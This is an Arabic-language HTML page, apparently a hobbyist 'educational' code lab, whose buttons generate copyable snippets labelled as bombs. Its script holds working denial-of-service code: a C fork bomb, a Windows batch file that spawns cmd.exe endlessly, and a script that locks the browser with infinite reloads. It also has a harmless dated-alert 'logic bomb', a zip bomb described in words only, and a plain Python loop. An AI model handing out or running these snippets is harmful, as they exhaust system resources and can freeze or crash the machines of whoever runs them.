<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مختبر رضا للبرمجيات</title>
    <style>
        /* تصميم هادئ واحترافي */
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .container {
            width: 100%;
            max-width: 1000px;
            background: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }

        h1 {
            color: #81d4fa;
            text-align: center;
            margin-bottom: 10px;
        }

        p.subtitle {
            text-align: center;
            color: #aaa;
            margin-bottom: 30px;
        }

        /* شبكة الأزرار */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .btn {
            background: #2c2c2c;
            color: #81d4fa;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            text-align: center;
        }

        .btn:hover {
            background: #81d4fa;
            color: #121212;
            border-color: #81d4fa;
        }

        /* منطقة الأكواد */
        .code-area {
            position: relative;
            background: #000;
            border-radius: 8px;
            padding: 20px;
            border: 1px solid #333;
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            border-bottom: 1px solid #222;
            padding-bottom: 10px;
        }

        textarea {
            width: 100%;
            height: 350px;
            background: transparent;
            color: #cfd8dc;
            border: none;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            resize: none;
            outline: none;
            direction: ltr;
        }

        .copy-btn {
            background: #4caf50;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 4px;
            cursor: pointer;
        }

        .copy-btn:hover { background: #45a049; }

        footer {
            margin-top: 30px;
            color: #666;
            font-size: 13px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>مختبر رضا لتوليد الأكواد</h1>
    <p class="subtitle">اختر نوع القالب البرمجي لتوليد الكود التعليمي المناسب</p>

    <div class="grid">
        <div class="btn" onclick="gen('logic')">قنبلة منطقية (JS)</div>
        <div class="btn" onclick="gen('fork')">قنبلة التشعب (C)</div>
        <div class="btn" onclick="gen('zip')">قنبلة الملفات (Structure)</div>
        <div class="btn" onclick="gen('crash')">قفل المتصفح (HTML)</div>
        <div class="btn" onclick="gen('py_loop')">تكرار لانهائي (Python)</div>
        <div class="btn" onclick="gen('batch')">قنبلة الأوامر (Windows)</div>
    </div>

    <div class="code-area">
        <div class="code-header">
            <span id="code-title">بانتظار اختيارك...</span>
            <button class="copy-btn" onclick="copy()">نسخ الكود</button>
        </div>
        <textarea id="output" readonly></textarea>
    </div>
</div>

<footer>حقوق الطبع محفوظة © 2026 - مختبر رضا التعليمي</footer>

<script>
    function gen(type) {
        const out = document.getElementById('output');
        const title = document.getElementById('code-title');
        let code = "";

        switch(type) {
            case 'logic':
                title.innerText = "قنبلة منطقية - JavaScript";
                code = "// كود يعمل عند تحقق شرط زمني محدد\nconst targetDate = '2026-05-20';\nif (new Date().toISOString().split('T')[0] === targetDate) {\n    alert('تم تفعيل الكود المجدول');\n}";
                break;
            case 'fork':
                title.innerText = "قنبلة التشعب - C Language";
                code = "#include <unistd.h>\nint main() {\n    while(1) {\n        fork();\n    }\n    return 0;\n}";
                break;
            case 'zip':
                title.innerText = "بنية ملفات مضغوطة - Zip Bomb";
                code = "[+] بنية تقنية:\n- ملف مضغوط بحجم صغير جداً\n- عند فكه ينتج ملفات ضخمة جداً\n- يستخدم لاختبار برامج الحماية.";
                break;
            case 'crash':
                title.innerText = "تعليق المتصفح - HTML/JS";
                code = "<script>\n    while(true) {\n        window.location.reload();\n    }\n<\/script>";
                break;
            case 'py_loop':
                title.innerText = "تكرار بايثون - Python";
                code = "import os\nwhile True:\n    print('نظام الاختبار يعمل...')";
                break;
            case 'batch':
                title.innerText = "ملف أوامر - Batch File";
                code = "@echo off\n:loop\nstart cmd.exe\ngoto loop";
                break;
        }
        out.value = code;
    }

    function copy() {
        const copyText = document.getElementById("output");
        if(!copyText.value) return;
        copyText.select();
        document.execCommand("copy");
        alert("تم نسخ الكود بنجاح!");
    }
</script>

</body>
</html>
